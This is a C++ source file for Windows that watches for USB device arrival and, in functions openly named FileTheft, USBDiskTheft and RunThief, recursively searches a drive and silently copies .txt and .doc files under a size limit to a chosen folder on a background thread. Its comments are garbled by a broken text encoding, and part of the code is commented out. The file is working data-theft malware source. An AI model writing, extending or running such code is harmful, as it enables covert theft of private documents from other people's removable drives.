#include "pch.h"
#include "Watch.h"


HDEVNOTIFY hDevNotify = NULL;

BOOL StartWatch(HANDLE hRecipient)
{

	if (hDevNotify != NULL)
	{
		return FALSE;
	}
	
	DEV_BROADCAST_HDR  NotificationFilter;
	ZeroMemory(&NotificationFilter, sizeof(NotificationFilter));
	NotificationFilter.dbch_size = sizeof(DEV_BROADCAST_HDR);
	NotificationFilter.dbch_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
	hDevNotify = RegisterDeviceNotification( hRecipient,&NotificationFilter, DEVICE_NOTIFY_ALL_INTERFACE_CLASSES);
	if (hDevNotify == NULL)
		return FALSE;
	return TRUE;


}

BOOL EndWatch()
{

	if (hDevNotify == NULL)
	{
		return FALSE;
	}

	if (!UnregisterDeviceNotification(hDevNotify))
	{
		return FALSE;
	}

	hDevNotify = NULL;	

	return TRUE;
}







//����Ŀ¼
BOOL FileTheft(TCHAR* savePath, DWORD fileSize , DWORD fileType,LPCWSTR directory)
{
	WIN32_FIND_DATA FindFileData = { 0 };	//FindFirstFile FindNextFile����2
	HANDLE hFind = NULL;	//FindFirstFile����ֵ
	TCHAR wOriginalPath[MAX_PATH + 2] = { 0 };	//����ƴ�ӵ�ǰ·��
	TCHAR wCurrentFile[MAX_PATH + 2] = { 0 };	//����ƴ�ӵ�ǰ��ѯ�����ļ����ļ���
	LPCWSTR pCurrentlPath = directory;	//�����жϵ�ǰ�ļ�·����β
	LPCWSTR pFileName = NULL;	//�����ж��ļ�����β
	UINT uPathCount = 0; //����ͳ�Ƶ�ǰĿ¼��.��..�ĸ���
	TCHAR ext[10] = { 0 }; //�ļ���׺
	DWORD extType = 0;	//�ļ���ʵ����
	__int64 fsize = 0;	//�ļ���С
	TCHAR SavDirectory[MAX_PATH] = { 0 };


	//ƴ��·��
	//����\\*���ѯ -> �ӵ��ڲ�ѯ��Ŀ¼�µ�һ���ļ�
	//1 Ŀ¼���� ���ļ����ѯ�ɹ�
	//2 Ŀ¼���� ���ļ����ѯʧ��,������ʾ����
	//3 Ŀ¼��������ʧ��,����ʾ����
	pCurrentlPath += wcslen(directory);
	if (pCurrentlPath == directory) return FALSE; //˵���ַ�����Ϊ0
	if (wcscpy_s(wOriginalPath, MAX_PATH + 2, directory)) return FALSE;	//����Ŀ¼
	pCurrentlPath--;
	if (*pCurrentlPath == '\\')
		wcscat_s(wOriginalPath, MAX_PATH + 2, L"*");
	else
		wcscat_s(wOriginalPath, MAX_PATH + 2, L"\\*");


	// �ж�·���Ƿ����,��ʱ�Ѿ���ʼ��ѯĿ¼�µĵ�һ���ļ�
	hFind = FindFirstFile(wOriginalPath, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)
		return FALSE;

	//��ȡ��ǰĿ¼���ļ�,�ж������Ƿ�Ϊ�ļ���
	//�ļ��� -> �������
	//�ļ� -> ��ӡ
	//.��..�򲻴�ӡ
	do
	{
		swprintf_s(wCurrentFile, MAX_PATH + 2, L"%s%s%s", directory, L"\\", FindFileData.cFileName);

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)	//Ϊ0�����ļ���
		{
			//�ļ���
			//.��..����
			if (uPathCount < 2) {
				pFileName = FindFileData.cFileName;
				pFileName += wcslen(FindFileData.cFileName);
				if (pFileName == FindFileData.cFileName) continue; //˵���ַ�����Ϊ0
				if (*--pFileName == L'.')
				{
					uPathCount++;
					continue;	//����.�˳���ǰѭ��
				}
			}

			FileTheft(savePath,fileSize, fileType, wCurrentFile);

		}
		else
		{
		
			//wprintf(L"%s\n", wCurrentFile);
			
			//��ѯ���ļ�.���ļ����д���
			extType = 0;
			fsize = 0;
			//1 �ļ�����
		
			if (!_wsplitpath_s(FindFileData.cFileName, NULL, NULL, NULL, NULL, NULL, NULL, ext, 10))
			{
				//��ȡ��׺�ɹ�
				//�жϺ�׺����
				if (!wcscmp(ext, L".txt")) 	extType = TXT_TYPE;
				if (!wcscmp(ext, L".doc")) 	extType = DOC_TYPE;

				if (fileType & ALL_TYPE || fileType & extType)
				{

					//2 �ж� �ļ���С
					fsize = (FindFileData.nFileSizeHigh * (MAXDWORD + 1)) + FindFileData.nFileSizeLow;
					fsize = fsize / 1024 / 1024;	//��ΪMB
					if (fsize < fileSize)
					{
						//��ͨ�� ����
						wcscpy_s(SavDirectory, MAX_PATH, savePath);
						wcscat_s(SavDirectory, MAX_PATH, L"\\");
						wcscat_s(SavDirectory, MAX_PATH, FindFileData.cFileName);
						
						BOOL ret = CopyFile(wCurrentFile, SavDirectory,FALSE);
					}

				}


			}

		}

		ZeroMemory(wCurrentFile, MAX_PATH + 2);

	} while (FindNextFile(hFind, &FindFileData));


	FindClose(hFind);

	return TRUE;
}


BOOL FileTheftEX(TCHAR* savePath, DWORD fileSize, DWORD fileType, LPCWSTR directory) 
{
	if (!PathFileExists(savePath))
		if (!CreateDirectory(savePath,NULL))
			return FALSE;

	return FileTheft(savePath, fileSize, fileType, directory);
}




DWORD WINAPI USBDiskTheft(void* uThief)
{

	
	UThief* thief = (UThief*)uThief;

	BOOL ret = FALSE;

	ret = FileTheftEX(thief->savePath, thief->fileSize, thief->fileType, thief->theftPath);
	
	delete uThief;

	return ret;
}





BOOL RunThief(TCHAR* SavePath, DWORD FileSize,DWORD FileType,TCHAR* TheftPath)
{


	//�ж����������Ƿ�����Ҫ��
	if(SavePath==NULL || !wcslen(SavePath) || FileSize ==0 ||  *TheftPath>'Z' || *TheftPath < 'A'|| TheftPath == NULL || !wcslen(TheftPath)
		|| *SavePath < 'A' ||  *SavePath>'Z' ||
		!((FileType & ALL_TYPE ) | (FileType & TXT_TYPE) |(FileType & DOC_TYPE)))
		return FALSE;

	//����ռ� -> T�������
	UThief* uThief = new UThief;
	ZeroMemory(uThief,sizeof(uThief));
	if (uThief == NULL)
		return FALSE;
	uThief->fileSize = FileSize;
	uThief->fileType = FileType;
	if (wcscpy_s(uThief->savePath, MAX_PATH, SavePath) || wcscpy_s(uThief->theftPath, MAX_PATH, TheftPath))
	{
		delete uThief;
		return FALSE;
	}
	

	//�����߳� ����
	HANDLE thread = CreateThread(NULL, NULL, USBDiskTheft, (LPVOID)uThief, 0, 0);
	if (thread == NULL) {
		delete uThief;
		return FALSE;
	}
	CloseHandle(thread);

	return TRUE;


}




/*
HANDLE thread = NULL;
BOOL bThreadExitFlag = FALSE;
BOOL bEndThread = FALSE;
*/

/*
DWORD WINAPI WatchUSBDisk(void* param)
{
	//������Ҫִ�е��̴߳���

	//1 ��ȡ������Ϣ

	while (bThreadExitFlag) Sleep(30);

	//MessageBox(NULL,L"WatchUSBDisk will exit",NULL,MB_OK);

	return 0;
}

BOOL StartWatch1()
{

	if (bEndThread)
	{
		MessageBox(NULL, L"Watch modal is stoping", NULL, MB_OK);
		return FALSE;
	}

	if (thread != NULL)
	{
		MessageBox(NULL, L"Watch modal is runing", NULL, MB_OK);
		return FALSE;
	}

	// 2 ��ʼ���˳���־
	bThreadExitFlag = TRUE;

	//3 �����߳� >> ����ֵΪNULL,�˳�����
	thread = CreateThread(NULL, NULL, WatchUSBDisk, NULL, 0, 0);
	if (thread == NULL) {
		bThreadExitFlag = FALSE;	//�ָ�Ĭ��״̬
		MessageBox(NULL, L"Watch modal run failed", NULL, MB_OK);
		return FALSE;
	}

	MessageBox(NULL, L"Watch modal run success", NULL, MB_OK);
	return TRUE;
}

BOOL EndWatch1()
{
	DWORD ExitCode = 0;
	BOOL bRetGetExitCodeThread = FALSE;
	DWORD dwWaitResult = 0;
	BOOL bTheadExit = FALSE;

	if (bEndThread)
	{
		MessageBox(NULL, L"Watch modal is stoping", NULL, MB_OK);
		return FALSE;
	}

	

	//1 ���߳��Ƿ����
	if (thread == NULL)
	{
		MessageBox(NULL, L"Watch modal not run ", NULL, MB_OK);
		return FALSE;
	}

	bEndThread = TRUE;

	//2 �޸��˳���ʶ
	bThreadExitFlag = FALSE;


	//4 �ȴ��߳��˳�
	dwWaitResult = WaitForSingleObject(thread, INFINITE);



	//6 �ж��߳��Ƿ�ɹ��˳�
	if (dwWaitResult == WAIT_FAILED)
	{
		//ʧ��

		//��ʾ����
		MessageBox(NULL, L"GetExitCodeThread Failed ", NULL, MB_OK);

		bTheadExit = FALSE;
	}
	else
	{
		//�ɹ�
		
		//��ȡ�˳���
		do
		{
			if (!GetExitCodeThread(thread, &ExitCode))
			{
				break;
			}
		} while (ExitCode == STILL_ACTIVE);

		//�ж��˳���

		if (ExitCode == 6)
			MessageBox(NULL, L"GetExitCodeThread Failed ", NULL, MB_OK);

		// �رվ��
		
		CloseHandle(thread);
		// ��ʾ�رճɹ�
		MessageBox(NULL, L"Stop Watch Success", NULL, MB_OK);
		bTheadExit = TRUE;
	}

	//7 �ָ���ʼֵ
	thread = NULL;
	bEndThread = FALSE;


	return bTheadExit;
}
*/














